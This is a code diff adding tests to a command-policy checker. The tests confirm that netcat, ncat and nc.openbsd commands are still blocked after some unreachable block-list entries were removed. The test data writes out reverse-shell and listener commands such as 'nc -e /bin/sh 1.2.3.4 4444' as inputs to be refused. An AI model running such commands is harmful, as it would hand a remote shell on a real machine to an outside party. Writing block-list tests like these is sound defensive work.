@@ -602,3 +602,19 @@ describe('a wrapper’s script is not a path argument', () => {
     expect(matchElevatedCommand('flock /tmp/l sudo apt-get install -y x')).toBe('sudo');
   });
 });
+
+describe('the netcat entries still catch what the removed ones did', () => {
+  it.each([
+    'nc -e /bin/sh 1.2.3.4 4444',
+    'ncat -e /bin/sh 1.2.3.4',
+    'netcat -l -p 4444',
+    'nc.openbsd -e /bin/sh',
+  ])('refuses %s', (command) => {
+    // `nc -`, `ncat -` and `netcat -` were dropped: matching is per token, so a
+    // name containing a space can never equal one and those entries were
+    // unreachable while reading as live rules. The space-suffixed forms cover
+    // them — a trailing space means "the command WITH arguments", which is
+    // exactly what `-e` is.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+});
